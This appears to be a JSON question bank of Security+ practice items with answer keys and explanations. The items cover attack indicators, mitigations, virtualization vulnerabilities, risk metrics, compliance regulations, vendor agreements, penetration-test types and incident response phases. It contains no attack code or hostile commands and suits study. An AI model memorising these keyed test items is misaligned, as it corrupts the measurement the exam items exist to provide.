    {"type":"mcq","question":"A monitoring system flags an account because it has 4 simultaneous active sessions from 4 different geographic regions, none more than 300 miles apart. No single login is impossible by itself. Which indicator BEST describes the alert?","difficulty":"Exam Level","topic":"Malicious Activity Indicators","objective":"2.4","options":{"A":"Impossible travel","B":"Concurrent session usage","C":"Account lockout","D":"Out-of-cycle logging"},"answer":"B","explanation":"Concurrent session usage detects multiple active sessions for one account that exceed normal usage patterns — sharing credentials, credential compromise without revoking the original session, or scripted access. The 4 simultaneous sessions trigger this. Impossible travel (A) requires geographically-impossible login transitions; here all four regions are within physical-travel range. Account lockout (C) signals authentication failures. Out-of-cycle logging (D) is logs appearing at unusual times, not multiple sessions.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A web server's CPU utilization sits steadily at 99% for three days. The bandwidth consumption to the server has also increased 8x over the baseline. Customers report timeouts. Which indicator class is this?","difficulty":"Foundational","topic":"Malicious Activity Indicators","objective":"2.4","options":{"A":"Resource consumption","B":"Resource inaccessibility","C":"Missing logs","D":"Out-of-cycle logging"},"answer":"A","explanation":"Resource consumption is the indicator class for abnormally high CPU, memory, bandwidth, or storage utilization — often signalling cryptomining, DDoS, or runaway processes. Resource inaccessibility (B) is the inverse — legitimate services unable to access resources they need. Missing logs (C) is a log-gap indicator. Out-of-cycle logging (D) is logs appearing at unusual times.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A security analyst notices that the firewall logs for the period 02:00 to 03:30 on Tuesday are completely empty, while every other hour of the week has hundreds to thousands of entries. Which indicator does this BEST match?","difficulty":"Exam Level","topic":"Malicious Activity Indicators","objective":"2.4","options":{"A":"Concurrent session usage","B":"Out-of-cycle logging","C":"Missing logs","D":"Blocked content"},"answer":"C","explanation":"Missing logs — a gap where logs should exist but do not — is one of CompTIA's enumerated indicators of malicious activity. Attackers commonly delete or disable logging during their access window. Out-of-cycle logging (B) is logs appearing at unusual times (e.g., admin actions at 3am from a non-admin host), not gaps. Concurrent session usage (A) is about simultaneous sessions. Blocked content (D) is the firewall's record of denials, which would be MORE entries if anything.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company splits its internal network into multiple isolated segments: workstations in one, servers in another, IoT devices in a third, and the OT control system in a fourth. Each segment can only communicate with others through controlled choke points enforcing strict policy. Which mitigation technique is this?","difficulty":"Foundational","topic":"Mitigation Techniques","objective":"2.5","options":{"A":"Segmentation","B":"Least privilege","C":"Isolation","D":"Hardening"},"answer":"A","explanation":"Segmentation divides a network into smaller controlled zones with policy enforced at the boundaries — the textbook description. Least privilege (B) restricts user/process permissions to the minimum needed; it's a related concept but applies to identity, not network topology. Isolation (C) is the stronger variant — air-gapping with no communication path at all. Hardening (D) reduces attack surface on individual devices (disable services, patch, etc.), not network topology.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"After a developer accidentally pushed production database credentials to a public Git repository, the security team implements a new control: every developer account is granted only the specific permissions needed to do their current job, and admin rights require explicit just-in-time elevation with approval. Which principle BEST captures this approach?","difficulty":"Exam Level","topic":"Mitigation Techniques","objective":"2.5","options":{"A":"Segmentation","B":"Least privilege","C":"Configuration enforcement","D":"Patching"},"answer":"B","explanation":"Least privilege grants users and processes only the permissions strictly required for their function, with elevation requiring explicit approval — the principle described. Segmentation (A) divides the network. Configuration enforcement (C) ensures systems match defined baselines, distinct from per-user permission scoping. Patching (D) addresses vulnerabilities in software, not access rights.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"On a fleet of corporate workstations, only software from a vendor-approved catalog can execute. When a user attempts to run any other binary — including ones they downloaded themselves — execution is blocked. Which mitigation control is this?","difficulty":"Foundational","topic":"Mitigation Techniques","objective":"2.5","options":{"A":"Application allow list","B":"Host-based firewall","C":"Endpoint detection and response","D":"Segmentation"},"answer":"A","explanation":"Application allow lists permit only known-good executables to run; everything else is denied by default. The 'allow list' framing is the explicit positive-control model. Host-based firewall (B) controls network traffic, not binary execution. EDR (C) detects and responds to threats but doesn't necessarily block execution at the policy layer (some EDR includes allow-listing as a feature but the precise term for this control is application allow list). Segmentation (D) is network-topology.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A newly deployed server has all unused services disabled, has had default passwords changed, has its host-based firewall configured to deny inbound by default, has unnecessary user accounts removed, and is patched to current. Which mitigation category does this work fall under?","difficulty":"Foundational","topic":"Mitigation Techniques","objective":"2.5","options":{"A":"Hardening","B":"Segmentation","C":"Decommissioning","D":"Least privilege"},"answer":"A","explanation":"Hardening reduces a system's attack surface by removing or disabling unnecessary services, applying patches, changing defaults, restricting accounts, and configuring host firewall — exactly what is described. Segmentation (B) is network-topology. Decommissioning (C) is the secure end-of-life retirement of a system. Least privilege (D) is the underlying principle but the specific operational activity here is system hardening.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    ...
    {"type":"mcq","question":"A virtual machine running on a hypervisor exploits a flaw in the hypervisor's memory handling to read and write memory belonging to another VM on the same host. Which vulnerability class fits BEST?","difficulty":"Exam Level","topic":"OS & Hardware Vulnerabilities","objective":"2.3","options":{"A":"VM escape","B":"Resource reuse","C":"Side loading","D":"Memory injection"},"answer":"A","explanation":"VM escape is the breaking of a virtual machine's isolation boundary to access the hypervisor or other VMs — a virtualization-specific vulnerability class explicitly enumerated in CompTIA's 2.3. Resource reuse (B) is when memory or storage previously assigned to one tenant is reassigned to another without proper sanitization, leaking residual data. Side loading (C) installs apps outside the official app store (mobile context). Memory injection (D) is the application-vulnerability class for injecting code into a process.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A cloud customer notices that their newly provisioned virtual machine instance contains residual fragments of files belonging to a previous tenant in unallocated disk sectors. Which vulnerability class is this?","difficulty":"Hard","topic":"OS & Hardware Vulnerabilities","objective":"2.3","options":{"A":"VM escape","B":"Resource reuse","C":"Misconfiguration","D":"Race condition"},"answer":"B","explanation":"Resource reuse is the virtualization-specific vulnerability where storage or memory previously assigned to one workload is reassigned to another without proper sanitization, leaking data across tenancy boundaries. CompTIA enumerates this distinctly in 2.3. VM escape (A) involves breaking out of the VM boundary to attack the hypervisor; here no escape occurred — data leaked passively. Misconfiguration (C) is operational, not a structural sanitization failure. Race condition (D) is timing-based concurrency.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An industrial control system vendor announces that a critical line of programmable logic controllers (PLCs) reached end-of-life two years ago. The operator's factory still depends on 30 of these PLCs. A new vulnerability has been published affecting all of them, but no patch will ever be released. Which vulnerability category is this?","difficulty":"Exam Level","topic":"OS & Hardware Vulnerabilities","objective":"2.3","options":{"A":"End-of-life / legacy hardware","B":"Firmware vulnerability","C":"Default credentials","D":"Misconfiguration"},"answer":"A","explanation":"End-of-life / legacy hardware is a hardware vulnerability category explicitly listed in CompTIA's 2.3: vendor-unsupported equipment whose new flaws will never receive patches. Firmware vulnerability (B) is a related category but applies even to supported hardware. Default credentials (C) is an authentication-surface issue distinct from patch-availability. Misconfiguration (D) is an operational defect, not a vendor-support-status issue. Mitigation options for EOL hardware include compensating controls, segmentation, or replacement — never patching.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A risk register entry shows: SLE = $50,000, ARO = 0.2. What is the ALE?","difficulty":"Foundational","topic":"Risk Management","objective":"5.2","options":{"A":"$10,000","B":"$50,000","C":"$250,000","D":"$2,500"},"answer":"A","explanation":"ALE = SLE × ARO = $50,000 × 0.2 = $10,000. The Annualized Loss Expectancy represents the expected yearly loss from this risk. Option B is just the SLE (single event cost). Option C inverts the calculation. Option D divides instead of multiplying. The ALE drives risk-treatment cost-benefit decisions — spending more than $10k/yr to mitigate this specific risk would be net-negative.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An organization decides that the cost of mitigating a specific cyber risk exceeds the potential loss, and chooses to do nothing while documenting the decision and getting executive sign-off. Which risk treatment strategy is this?","difficulty":"Exam Level","topic":"Risk Management","objective":"5.2","options":{"A":"Risk transfer","B":"Risk acceptance","C":"Risk avoidance","D":"Risk mitigation"},"answer":"B","explanation":"Risk acceptance means the organization knowingly takes on the risk, typically because the cost of treatment exceeds the expected loss. The documented decision + executive sign-off is the formal acceptance record. Transfer (A) shifts risk to a third party (insurance, contract). Avoidance (C) eliminates the activity creating the risk. Mitigation (D) reduces likelihood or impact through controls.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company purchases a cyber-insurance policy that pays out up to $5M for ransomware-related losses. Which risk treatment strategy does this represent?","difficulty":"Foundational","topic":"Risk Management","objective":"5.2","options":{"A":"Risk avoidance","B":"Risk transfer","C":"Risk acceptance","D":"Risk mitigation"},"answer":"B","explanation":"Risk transfer shifts financial impact to a third party — insurance is the canonical example. The risk still exists, but the financial loss is shouldered by the insurer. Avoidance (A) would mean not engaging in the risky activity at all. Acceptance (C) keeps full liability. Mitigation (D) reduces the risk itself via controls.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A business continuity plan specifies: critical customer-facing services must be restored within 4 hours of any outage, and no more than 15 minutes of transaction data may be lost. Which two metrics are these?","difficulty":"Exam Level","topic":"Risk Management","objective":"5.2","options":{"A":"RTO = 4h, RPO = 15min","B":"RPO = 4h, RTO = 15min","C":"MTTR = 4h, MTBF = 15min","D":"SLA = 4h, OLA = 15min"},"answer":"A","explanation":"Recovery Time Objective (RTO) = acceptable downtime (4 hours to restore service). Recovery Point Objective (RPO) = acceptable data loss (15 minutes of transactions). Option B reverses the two. MTTR/MTBF (C) measure hardware reliability statistics, not BC targets. SLA/OLA (D) are service-level agreements, related but distinct concepts.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An organization with a conservative risk appetite is evaluating a new payment processing system. Which approach BEST aligns with conservative risk appetite?","difficulty":"Exam Level","topic":"Risk Management","objective":"5.2","options":{"A":"Adopt the lowest-cost option to maximize ROI","B":"Choose the option with extensive security certifications (PCI DSS Level 1, SOC 2 Type II), even at higher cost","C":"Build in-house to avoid third-party dependencies","D":"Defer the decision indefinitely"},"answer":"B","explanation":"Conservative risk appetite favors well-proven, certified options over cost optimization or unproven alternatives. PCI DSS + SOC 2 certifications signal third-party-validated controls. Option A reflects expansionary/aggressive risk appetite. Option C may introduce new build/maintenance risks. Option D is paralysis, not risk management.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Which risk-analysis approach assigns numeric values (probability, dollar impact) to enable mathematical calculation of expected loss?","difficulty":"Foundational","topic":"Risk Management","objective":"5.2","options":{"A":"Qualitative analysis","B":"Quantitative analysis","C":"Heuristic analysis","D":"Subjective analysis"},"answer":"B","explanation":"Quantitative risk analysis uses numeric values — SLE, ARO, ALE, probability percentages — to compute expected loss in dollars. Qualitative (A) uses ratings like High/Medium/Low without numbers. C and D are not CompTIA-recognized risk-analysis methodologies. Most mature programs combine both: qualitative for triage, quantitative for prioritized risks.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A risk register entry lists: 'Risk owner: CFO'. What does the risk owner role MEAN?","difficulty":"Exam Level","topic":"Risk Management","objective":"5.2","options":{"A":"The person who caused the risk","B":"The person accountable for treating and monitoring the risk","C":"The person who must pay for any losses","D":"The person who first identified the risk"},"answer":"B","explanation":"The risk owner is accountable for managing the risk — deciding the treatment strategy (mitigate/transfer/accept/avoid), funding controls, and monitoring residual risk. Ownership ensures someone has the authority and responsibility to act. Option A confuses owner with root cause. Option C confuses ownership with insurance. Option D confuses owner with reporter.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A Business Impact Analysis (BIA) identifies that the order-processing system has an MTBF of 720 hours and an MTTR of 4 hours. What do these tell you?","difficulty":"Hard","topic":"Risk Management","objective":"5.2","options":{"A":"The system is expected to fail every 720 hours on average, and recovery takes about 4 hours each time","B":"The system has been running for 720 hours and will need 4 hours of maintenance","C":"720 hours is the RPO and 4 hours is the RTO","D":"The system is offline 720 hours per year"},"answer":"A","explanation":"Mean Time Between Failures (MTBF) is the average operational time between failures — here, ~30 days between incidents. Mean Time To Repair (MTTR) is the average time to restore service after a failure — here, 4 hours. Together they describe hardware reliability statistics, distinct from RPO/RTO which are BC TARGETS not measured statistics. Option B confuses MTBF with run-time. Option C confuses these reliability metrics with DR objectives. Option D inverts the meaning of MTBF.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"multi-select","question":"Which TWO are valid risk treatment strategies?","difficulty":"Foundational","topic":"Risk Management","objective":"5.2","options":{"A":"Mitigate","B":"Audit","C":"Transfer","D":"Document"},"answer":["A","C"],"explanation":"CompTIA's four risk treatment strategies are: Mitigate (reduce via controls), Transfer (shift to third party), Accept (knowingly take on), Avoid (eliminate the activity). Audit (B) is an assessment activity, not a treatment. Document (D) is part of governance but not a treatment strategy on its own.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company decides to stop offering a particular product feature entirely because it introduces regulatory risk they cannot adequately mitigate. Which risk strategy is this?","difficulty":"Foundational","topic":"Risk Management","objective":"5.2","options":{"A":"Risk acceptance","B":"Risk avoidance","C":"Risk transfer","D":"Risk mitigation"},"answer":"B","explanation":"Risk avoidance eliminates the activity creating the risk — discontinuing the feature removes the regulatory exposure entirely. Avoidance is the strongest treatment because it removes the risk source, not just the impact. Acceptance (A) would continue offering the feature. Transfer (C) cannot transfer regulatory liability. Mitigation (D) would add controls to keep offering the feature safely; the company has decided that's not feasible.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A US-based hospital that processes electronic protected health information (ePHI) for its patients must comply with which regulation?","difficulty":"Foundational","topic":"Compliance Frameworks","objective":"5.4","options":{"A":"GDPR","B":"HIPAA","C":"PCI DSS","D":"SOX"},"answer":"B","explanation":"HIPAA (Health Insurance Portability and Accountability Act) governs PHI/ePHI in US healthcare. GDPR (A) is EU data protection. PCI DSS (C) governs payment card data. SOX (D) governs publicly-traded companies' financial reporting. Knowing which regulation applies based on data type + geography is exam-tested.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An EU resident demands that a US-based e-commerce company delete all their personal data permanently. Which regulation gives them this right?","difficulty":"Foundational","topic":"Compliance Frameworks","objective":"5.4","options":{"A":"HIPAA","B":"SOX","C":"GDPR","D":"FISMA"},"answer":"C","explanation":"GDPR (General Data Protection Regulation, EU 2018) includes the 'right to be forgotten' / erasure right (Article 17), which obligates data controllers to delete personal data on request from EU residents — regardless of the controller's home country. HIPAA (A) is US healthcare. SOX (B) is US financial reporting. FISMA (D) is US federal information security.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An online retailer storing credit card numbers must comply with which compliance framework?","difficulty":"Foundational","topic":"Compliance Frameworks","objective":"5.4","options":{"A":"HIPAA","B":"PCI DSS","C":"GDPR","D":"FERPA"},"answer":"B","explanation":"PCI DSS (Payment Card Industry Data Security Standard) governs any entity that stores, processes, or transmits cardholder data. Required by the card brands (Visa/MC/AmEx) via merchant agreements, not by statute. HIPAA (A) is healthcare. GDPR (C) is broader EU data protection but PCI DSS is more specific for payment card data. FERPA (D) is US student education records.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A publicly-traded US company is required by which regulation to maintain accurate financial records and assert internal control over financial reporting?","difficulty":"Foundational","topic":"Compliance Frameworks","objective":"5.4","options":{"A":"HIPAA","B":"PCI DSS","C":"SOX","D":"GLBA"},"answer":"C","explanation":"Sarbanes-Oxley (SOX, 2002) requires publicly-traded US companies to maintain accurate financial records, with the CEO/CFO personally certifying the accuracy and effectiveness of internal controls (Section 302/404). Passed after Enron/WorldCom. HIPAA is healthcare. PCI DSS is payment cards. GLBA (Gramm-Leach-Bliley) governs financial institutions' customer privacy.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Under GDPR, an organization that determines the purposes and means of processing personal data is called what?","difficulty":"Exam Level","topic":"Compliance Frameworks","objective":"5.4","options":{"A":"Data subject","B":"Data controller","C":"Data processor","D":"Data custodian"},"answer":"B","explanation":"GDPR distinguishes Data Controller (decides why and how data is processed — the responsible party, e.g., your e-commerce company), Data Processor (acts on the controller's behalf, e.g., a cloud hosting provider), Data Subject (the natural person whose data it is), and joint controllership. The controller carries primary accountability. Knowing this distinction is exam-tested for GDPR scenarios.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A US federal agency must implement security controls per which regulation?","difficulty":"Foundational","topic":"Compliance Frameworks","objective":"5.4","options":{"A":"FISMA","B":"HIPAA","C":"SOX","D":"GLBA"},"answer":"A","explanation":"FISMA (Federal Information Security Management Act, 2002) requires US federal agencies + their contractors to develop and maintain information security programs aligned with NIST standards (800-53 controls). HIPAA is healthcare, SOX is publicly-traded financials, GLBA is financial institutions' customer data.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company experiences a data breach exposing 200,000 EU residents' personal data. Under GDPR, what is the MAXIMUM possible fine?","difficulty":"Exam Level","topic":"Compliance Frameworks","objective":"5.4","options":{"A":"€10 million or 2% of global annual revenue, whichever is higher","B":"€20 million or 4% of global annual revenue, whichever is higher","C":"€100,000 fixed","D":"There is no fine, only mandatory notification"},"answer":"B","explanation":"GDPR's maximum fine is €20 million or 4% of global annual revenue (whichever is higher) for the most serious violations — Article 83(5). A lower tier of €10M/2% applies to less serious breaches. The 'global revenue' anchor is what makes GDPR enforcement bite for multinationals. Fixed fines (C) and notification-only (D) are common misconceptions.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company has not patched a critical vulnerability for 6 months despite knowing about it. After a breach attributable to that vulnerability, regulators levy fines and the company loses several contracts. Which two consequences of non-compliance are at play?","difficulty":"Exam Level","topic":"Compliance Frameworks","objective":"5.4","options":{"A":"Fines and reputational damage only","B":"Fines and loss of license","C":"Fines and contractual impacts","D":"Sanctions and reputational damage"},"answer":"C","explanation":"Two distinct consequences appear: regulatory fines (financial penalty from a governing body) and contractual impacts (lost contracts due to breach-of-contract or buyer-confidence loss). Reputational damage (A, D) likely also occurred but isn't explicitly named in the stem. Loss of license (B) would mean the company can no longer operate in a regulated activity at all. CompTIA enumerates fines / sanctions / reputational damage / loss of license / contractual impacts as the five non-compliance consequence categories.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company signs a contract with a cloud provider committing to 99.9% uptime with financial penalties for breaches. Which type of agreement is this?","difficulty":"Foundational","topic":"Third-Party Risk Management","objective":"5.3","options":{"A":"MOA","B":"SLA","C":"NDA","D":"MSA"},"answer":"B","explanation":"Service-Level Agreement (SLA) specifies measurable service expectations (uptime, response time, throughput) with penalties/remedies for misses. MOA (Memorandum of Agreement) is a broader formalized cooperation document. NDA (Non-Disclosure Agreement) covers confidentiality. MSA (Master Service Agreement) is the overarching contract framework; individual SLAs typically reference an MSA.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Two companies are exploring a possible joint venture and want to share confidential business information during negotiations without legal risk. Which agreement type fits?","difficulty":"Foundational","topic":"Third-Party Risk Management","objective":"5.3","options":{"A":"SLA","B":"MOU","C":"NDA","D":"BPA"},"answer":"C","explanation":"Non-Disclosure Agreement (NDA) binds the parties to confidentiality regarding shared information — the precise tool for protected information exchange during exploratory talks. SLA (A) governs service quality. MOU (B, Memorandum of Understanding) is a non-binding intent statement. BPA (D, Business Partners Agreement) governs an ongoing partnership relationship, not exploratory talks.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company is evaluating a potential vendor and requests evidence of independent audits, penetration tests, and SOC 2 reports. What is this activity called?","difficulty":"Foundational","topic":"Third-Party Risk Management","objective":"5.3","options":{"A":"Right-to-audit","B":"Due diligence","C":"Service-level review","D":"Rules of engagement"},"answer":"B","explanation":"Due diligence is the vendor-evaluation process before contracting — gathering and reviewing evidence of the vendor's security posture, financial stability, and compliance. The right-to-audit (A) is a clause that gives ongoing audit rights AFTER contracting. Service-level review is post-contract performance assessment. Rules of engagement (D) is pen-test scope/limit specification.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A contract with a vendor includes a clause stating: 'Customer reserves the right to conduct or commission security audits of Vendor's facilities and systems with 30 days' notice.' What is this clause called?","difficulty":"Foundational","topic":"Third-Party Risk Management","objective":"5.3","options":{"A":"Due diligence clause","B":"Right-to-audit clause","C":"Non-disclosure clause","D":"Service-level clause"},"answer":"B","explanation":"Right-to-audit clauses preserve the customer's ability to verify vendor controls AFTER contracting — critical for regulated industries (PCI DSS, HIPAA, financial). The 30-day notice is typical reasonable accommodation. Due diligence (A) happens before signing. NDA covers confidentiality. SLA covers performance metrics.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"multi-select","question":"Which TWO are vendor-assessment activities a security team would perform?","difficulty":"Exam Level","topic":"Third-Party Risk Management","objective":"5.3","options":{"A":"Penetration testing the vendor with vendor consent","B":"Requesting evidence of internal audits","C":"Sharing the company's source code with the vendor","D":"Performing background checks on the vendor's customers"},"answer":["A","B"],"explanation":"Penetration testing (A) and reviewing evidence of internal audits (B) are both enumerated vendor-assessment activities in CompTIA's 5.3 objective. They establish the vendor's actual security posture, not just claims. Option C is a code-sharing decision, not vendor assessment. Option D is unusual and not a recognized vendor-assessment activity (the vendor's customers are not the assessor's concern).","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A statement-of-work (SOW) for a penetration test specifies which systems are in scope, which testing methods are allowed, and what data may NOT be exfiltrated even on successful exploit. Which concept does this document?","difficulty":"Exam Level","topic":"Third-Party Risk Management","objective":"5.3","options":{"A":"Service-level agreement","B":"Rules of engagement","C":"Right-to-audit","D":"Memorandum of understanding"},"answer":"B","explanation":"Rules of engagement (RoE) define the scope, methods, timeline, and limits of a security assessment — essential for both legal protection and operational safety. Penetration tests without RoE risk both legal liability and accidental damage to production. SLA (A) governs ongoing service. Right-to-audit (C) is the contractual right. MOU (D) is a non-binding intent document.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"During a penetration test, the tester is given network diagrams, source code, and credentials before starting. Which environment is this?","difficulty":"Foundational","topic":"Audits & Assessments","objective":"5.5","options":{"A":"Unknown environment","B":"Partially known environment","C":"Known environment","D":"External-only environment"},"answer":"C","explanation":"Known environment (formerly 'white-box') gives the tester maximum information up-front — quickest path to comprehensive coverage, used for in-depth analysis. Unknown / black-box (A) provides zero prior information, simulating an external attacker with no inside knowledge. Partially known / grey-box (B) provides some information. CompTIA shifted to 'known/partially known/unknown' terminology in SY0-701.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A penetration tester begins by reviewing the target company's public website, social media, employee LinkedIn profiles, and DNS records — without sending any traffic to the target. Which reconnaissance type is this?","difficulty":"Exam Level","topic":"Audits & Assessments","objective":"5.5","options":{"A":"Active reconnaissance","B":"Passive reconnaissance","C":"Engaged reconnaissance","D":"Reactive reconnaissance"},"answer":"B","explanation":"Passive reconnaissance gathers information about a target without interacting with the target's systems — OSINT, public records, social media, DNS queries to public name servers, search engines. Active reconnaissance (A) sends probes (port scans, vulnerability scans) directly to the target, generating logs. Passive is harder to detect; active is faster but noisier. C and D are not CompTIA-recognized terms.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A regulatory body conducts an examination of a financial institution's information security program against documented standards. Which assessment type is this?","difficulty":"Foundational","topic":"Audits & Assessments","objective":"5.5","options":{"A":"Internal self-assessment","B":"External regulatory audit","C":"Attestation","D":"Penetration test"},"answer":"B","explanation":"External regulatory audit is performed by a regulator or their delegate, against codified standards, with consequences for non-compliance. Internal self-assessment (A) is performed by the org's own staff. Attestation (C) is a formal statement of conformance (often issued AFTER an audit). Penetration test (D) tests technical controls, not full program conformance.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A pen-test team includes both offensive testers (red) and defensive responders (blue), with coordination between them in real-time to drive learning on both sides. Which pen-test approach is this?","difficulty":"Hard","topic":"Audits & Assessments","objective":"5.5","options":{"A":"Offensive penetration testing","B":"Defensive penetration testing","C":"Integrated penetration testing","D":"Physical penetration testing"},"answer":"C","explanation":"Integrated penetration testing (often called 'purple team') combines offensive and defensive teams working together — offensive demonstrates attack techniques, defensive practices detection and response, and both improve simultaneously. Offensive-only (A) is pure red team. Defensive-only (B) is blue team. Physical (D) tests physical security controls (badge cloning, lock picking, tailgating). CompTIA enumerates physical / offensive / defensive / integrated as the four pen-test types in 5.5.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company sends quarterly simulated phishing emails to all employees and measures click-through rates per department. Which security-awareness activity is this?","difficulty":"Foundational","topic":"Security Awareness & Training","objective":"5.6","options":{"A":"Phishing campaign","B":"Tabletop exercise","C":"Penetration test","D":"Vulnerability scan"},"answer":"A","explanation":"Phishing campaigns are simulated phishing emails sent to employees to measure susceptibility + drive training reinforcement. They are a SY0-701 5.6 enumerated security-awareness activity. Tabletop exercises (B) walk through incident scenarios verbally with IR teams. Pen test (C) targets technical controls. Vulnerability scan (D) targets known software flaws.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"During a security audit, an analyst notices that one employee always logs in at 3am from foreign IP addresses despite working a standard 9-5 in-office shift. This is flagged for investigation. Which awareness activity does this represent?","difficulty":"Exam Level","topic":"Security Awareness & Training","objective":"5.6","options":{"A":"Phishing campaign","B":"Anomalous behavior recognition","C":"Removable-media training","D":"Operational security drill"},"answer":"B","explanation":"Anomalous behavior recognition is the activity of identifying unusual behavior patterns that may indicate compromise, insider threat, or policy violation — CompTIA enumerates this in 5.6 alongside risky/unexpected/unintentional categories. The 3am foreign-IP login from an in-office worker fits 'unexpected' anomalous behavior. Phishing campaigns (A) test response to specific lures. C and D are different specific training areas.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Place the following incident response phases in correct order: Containment, Detection, Eradication, Lessons Learned, Preparation, Recovery, Identification. Which sequence matches CompTIA's IR process?","difficulty":"Foundational","topic":"Incident Response","objective":"4.8","options":{"A":"Preparation → Identification/Detection → Analysis → Containment → Eradication → Recovery → Lessons Learned","B":"Detection → Preparation → Containment → Recovery → Eradication → Analysis → Lessons Learned","C":"Identification → Containment → Preparation → Eradication → Recovery → Lessons Learned","D":"Preparation → Containment → Identification → Eradication → Recovery → Lessons Learned"},"answer":"A","explanation":"The PICERL/NIST incident response lifecycle order is: Preparation → Identification (Detection + Analysis) → Containment → Eradication → Recovery → Lessons Learned. Preparation comes FIRST (you can't respond well without prep). Containment comes BEFORE eradication (stop the spread, then remove the threat). Lessons Learned comes LAST (drives improvement). The order is exam-tested in drag-and-drop PBQs.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"During an active ransomware incident, the IR team isolates the infected segment from the rest of the network to prevent further spread. Which IR phase is this?","difficulty":"Foundational","topic":"Incident Response","objective":"4.8","options":{"A":"Identification","B":"Containment","C":"Eradication","D":"Recovery"},"answer":"B","explanation":"Containment is the phase that stops an incident from spreading further — network segmentation, host isolation, account disable. The threat is still present but bounded. Eradication (C) comes next: remove the malware/attacker from the environment. Identification (A) is detecting + characterizing the incident. Recovery (D) restores normal operations.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"After containing and eradicating a malware infection, the IR team carefully restores affected systems from clean backups, validates integrity, and monitors closely for re-infection. Which IR phase is this?","difficulty":"Foundational","topic":"Incident Response","objective":"4.8","options":{"A":"Containment","B":"Eradication","C":"Recovery","D":"Lessons Learned"},"answer":"C","explanation":"Recovery restores affected systems to normal operation — restoring from backups, rebuilding hosts, re-enabling network connections — with monitoring for re-infection. It comes AFTER containment + eradication. Lessons Learned (D) is the post-incident review that drives improvement; not the same as system restoration.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
